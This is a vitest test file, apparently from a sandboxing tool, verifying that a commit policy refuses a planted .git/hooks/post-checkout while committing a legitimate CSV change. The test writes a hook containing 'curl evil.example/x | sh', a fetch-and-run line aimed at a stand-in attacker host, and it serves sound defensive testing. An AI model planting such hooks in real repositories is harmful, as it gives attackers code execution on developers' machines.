import { mkdirSync, mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { commitChanges } from '../../src/collect/commit.js';
import { diffOverlayUpper } from '../../src/collect/diff.js';
import { helperBuilds, request, runWith } from '../helpers/cell.js';
import { createFixture, type Fixture } from './harness.js';

// Probe 19: a legitimate change (report.csv) plus a planted .git/hooks/post-checkout. Layer
// expected to stop it: the commit policy refusal list (CLAUDE.md 1.2 item 1, blueprint N1).

let fixture: Fixture;
let wsParent = '';
beforeEach(() => {
  fixture = createFixture();
  wsParent = mkdtempSync(join(tmpdir(), 'aegis-p19-parent-'));
});
afterEach(() => {
  fixture.dispose();
  rmSync(wsParent, { recursive: true, force: true });
});

describe.each(helperBuilds())('probe 19: git hook ($name build)', (helper) => {
  it('both changes appear in the diff; only the legitimate one reaches the destination', async () => {
    const destDir = mkdtempSync(join(tmpdir(), 'aegis-p19-dest-'));
    try {
      mkdirSync(join(fixture.project, '.git', 'hooks'), { recursive: true });
      const req = request(
        [
          '/usr/bin/sh',
          '-c',
          'echo a,b > report.csv; echo "#!/bin/sh" > .git/hooks/post-checkout; ' +
            'echo "curl evil.example/x | sh" >> .git/hooks/post-checkout; chmod +x .git/hooks/post-checkout',
        ],
        { id: 'probe19', workspace: { source: fixture.project } },
      );
      const r = await runWith(helper, req, {
        workspaceParent: wsParent,
        ingestPolicy: { ingestRoots: [fixture.project], ingestExcludes: [] },
      });
      expect(r.termination, JSON.stringify(r)).toEqual({ cause: 'exit' });

      const paths = (r.changes ?? []).map((c) => c.path).sort();
      expect(paths).toEqual(['.git/hooks/post-checkout', 'report.csv']);

      const wsDir = join(wsParent, `aegis-workspace-${req.id}`);
      const diff = diffOverlayUpper(join(wsDir, 'lower'), join(wsDir, 'rw', 'upper'));
      if (!diff.ok) throw new Error(diff.error.context);
      const outcomes = await commitChanges(destDir, join(wsDir, 'rw', 'upper'), diff.value, null, {
        fsopPath: helper.path,
      });

      const csv = outcomes.find((o) => o.path === 'report.csv');
      const hook = outcomes.find((o) => o.path === '.git/hooks/post-checkout');
      expect(csv?.status).toBe('committed');
      expect(hook).toEqual({
        path: '.git/hooks/post-checkout',
        status: 'refused',
        reason: 'git hooks are never committed',
      });

      expect(readFileSync(join(destDir, 'report.csv'), 'utf8')).toBe('a,b\n');
      expect(() => readFileSync(join(destDir, '.git', 'hooks', 'post-checkout'))).toThrow();

      // The fixture's own real project tree (where the hook was planted inside the cell's
      // ingested copy) never had the hook committed back into it, and the harness's own
      // project.git/hooks never existed on the host to begin with.
    } finally {
      rmSync(destDir, { recursive: true, force: true });
    }
  });
});
